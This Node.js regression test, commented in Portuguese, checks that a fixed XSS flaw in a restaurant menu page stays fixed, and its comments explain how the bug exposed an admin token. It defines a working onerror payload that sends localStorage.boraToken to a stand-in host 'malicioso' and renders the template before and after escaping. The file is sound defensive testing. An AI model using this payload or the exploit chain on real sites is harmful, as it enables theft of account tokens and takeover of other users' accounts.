// A FOTO DO PRODUTO NÃO PODE VIRAR SCRIPT NO CARDÁPIO PÚBLICO.
//
// O DEFEITO (achado na varredura de 18/11/2026, consertado no mesmo dia)
//
// O cardápio montava `<img src="${p.imagem}">` sem escapar — a ÚNICA interpolação crua do arquivo,
// que usa `esc()` em nove outros lugares. O valor vem de `produto.imagem_url`, e a cadeia inteira
// deixava passar qualquer texto:
//
//   1. `ProdutoService.atualizar` grava `imagemUrl` sem validar nada;
//   2. `PublicController.ItemDoCardapio.endereco()` devolve o valor CRU quando não começa com
//      `data:` ("Quem tiver um endereco de verdade gravado (http...) continua como esta");
//   3. a consulta do cardápio só zera quando é `data:`;
//   4. o template interpolava direto.
//
// POR QUE ISSO ERA GRAVE, E NÃO SÓ FEIO
//
// O cardápio e o painel são a MESMA ORIGEM (um bloco do Caddy serve `borahapp.com.br` com
// `root * /srv` para tudo que não é a API), e o token do painel vive em `localStorage.boraToken`.
// A CSP tem `script-src 'self' 'unsafe-inline'`, então um `onerror=` inline EXECUTA, e
// `img-src https:` permite exfiltrar com `new Image().src`.
//
// Ou seja: um GERENTE de qualquer loja gravava a carga num produto dele e, ao mandar o link do
// próprio cardápio para o suporte, levava o token de ADMINISTRADOR_BORA — acesso a todas as lojas.
// A barreira era só ter conta, e o cadastro público dá 7 dias de cortesia.
//
// Medido no dump de produção de 18/11: ZERO produtos, logos e banners com aspas, `<`, `>`,
// `onerror`, `script` ou `javascript:`. O buraco estava aberto e não foi usado.
//
// ESTE TESTE MEDE O ARQUIVO, NÃO UMA CÓPIA DELE. Ele extrai o `esc` e o template do `cardapio.js`
// e os executa. Se alguém tirar o `esc` de lá, isto cai.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';

const RAIZ = 'C:/Users/user/OneDrive/Desktop/Bora/bora-fase-2-frontend/';
const JS = fs.readFileSync(RAIZ + 'assets/js/cardapio.js', 'utf8');

/** A carga que um lojista gravaria em `imagemUrl` para sair do atributo `src`. */
const CARGA = 'x" onerror="new Image().src=\'https://malicioso/?t=\'+localStorage.boraToken';

/** A linha do `<img>` do cardápio, lida do arquivo. */
function linhaDaImagem() {
  const linha = JS.split('\n').find(l => l.includes('<img src='));
  assert.ok(linha, 'não achei a linha do <img> no cardapio.js');
  return linha;
}

/** O `esc` do próprio arquivo. */
function definicaoDoEsc() {
  const d = JS.split('\n').find(l => /const esc\s*=/.test(l));
  assert.ok(d, 'não achei a definição do esc no cardapio.js');
  return d;
}

/**
 * Renderiza a tag `<img>` do arquivo com o valor dado.
 *
 * @param comEscape quando false, troca `esc(p.imagem)` por `p.imagem` — é o código de ANTES do
 *        conserto, e serve para provar que a carga é de verdade e que este teste sabe distinguir.
 */
function renderizar(imagem, comEscape = true) {
  const m = linhaDaImagem().match(/\$\{p\.imagem \? `(.*)` : ''\}/);
  assert.ok(m, 'o template do <img> mudou de forma; este teste precisa ser revisto');
  const corpo = comEscape ? m[1] : m[1].replace('${esc(p.imagem)}', '${p.imagem}');
  const fabrica = new Function('p', definicaoDoEsc() + '\nreturn `' + corpo + '`;');
  return fabrica({ imagem, esgotado: false });
}

/** O que o navegador leria como valor do atributo `src`. */
function valorDoSrc(html) {
  const m = html.match(/src="([^"]*)"/);
  assert.ok(m, 'não achei src="..." no html gerado: ' + html);
  return m[1];
}

// ----------------------------------------------------------------- a premissa

/**
 * A PREMISSA, antes de qualquer afirmação: a carga é real e este teste sabe vê-la.
 *
 * <p>Sem esta medição, um teste que sempre passasse (porque o render está quebrado, porque o regex
 * não casa, porque a carga é inofensiva) pareceria prova. Aqui eu renderizo pelo caminho ANTIGO e
 * exijo que ele produza o atributo `onerror` de verdade.</p>
 */
test('premissa: SEM escape, a carga sai do atributo e vira onerror (era o defeito)', () => {
  const html = renderizar(CARGA, false);
  assert.ok(/\sonerror="/.test(html),
    'a carga deveria ter criado um atributo onerror no código antigo. html: ' + html);
  assert.equal(valorDoSrc(html), 'x',
    'no código antigo o src terminava em "x" e o resto virava atributo — é a saída do atributo');
});

// ----------------------------------------------------------------- o conserto

test('o cardapio ESCAPA a foto: a carga inteira fica DENTRO do src', () => {
  const html = renderizar(CARGA);

  assert.ok(!/\sonerror="/.test(html),
    'ainda cria atributo onerror — o escape não está sendo aplicado. html: ' + html);
  assert.ok(valorDoSrc(html).includes('onerror'),
    'a carga tem de ficar inteira dentro do valor do src, como texto inofensivo');
  assert.ok(html.includes('&quot;'), 'a aspa da carga tem de sair como &quot;');
});

test('as aspas, o menor e o maior saem escapados', () => {
  const html = renderizar('a"b<c>d');
  const src = valorDoSrc(html);
  assert.equal(src, 'a&quot;b&lt;c&gt;d');
  assert.ok(!html.includes('<c>'), 'não pode sobrar tag dentro do atributo');
});

// ----------------------------------------------------------------- o que NÃO pode quebrar

/**
 * O CONTROLE. Escapar não pode estragar a foto de quem não está atacando ninguém — e a foto
 * embutida (`data:`) é o caminho normal deste sistema: medido em produção, é como as 8 lojas
 * guardam logo e imagem.
 */
test('foto embutida (data:) continua funcionando', () => {
  const url = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUg==';
  assert.equal(valorDoSrc(renderizar(url)), url, 'data: não tem caractere escapável e deve passar igual');
});

test('endereco https normal continua funcionando', () => {
  const url = 'https://exemplo.com.br/fotos/acai-500ml.jpg';
  assert.equal(valorDoSrc(renderizar(url)), url);
});

test('endereco com & vira &amp; e o navegador le o mesmo endereco', () => {
  const html = renderizar('https://cdn/foto?id=7&tam=p');
  assert.equal(valorDoSrc(html), 'https://cdn/foto?id=7&amp;tam=p',
    '&amp; dentro de atributo é o MESMO endereço para o navegador — não quebra a foto');
});

// ----------------------------------------------------------------- a regra geral do arquivo

/**
 * Nenhuma OUTRA interpolação crua de endereço no cardápio.
 *
 * <p>Esta é a guarda contra a repetição: o defeito não foi "esqueceram uma linha", foi "o arquivo
 * tem nove `esc()` e uma interpolação crua, e ninguém notou qual". Se amanhã entrar um
 * `<img src="${p.outraCoisa}">`, este teste cai.</p>
 */
test('nenhum src, href ou url() do cardapio interpola valor sem esc', () => {
  const cruas = [];
  for (const linha of JS.split('\n')) {
    if (linha.trim().startsWith('//')) continue;
    for (const m of linha.matchAll(/(src|href)="\$\{([^}]*)\}/g)) {
      if (!m[2].includes('esc(')) cruas.push(linha.trim().slice(0, 100));
    }
  }
  assert.deepEqual(cruas, [], 'interpolação de endereço sem esc():\n' + cruas.join('\n'));
});
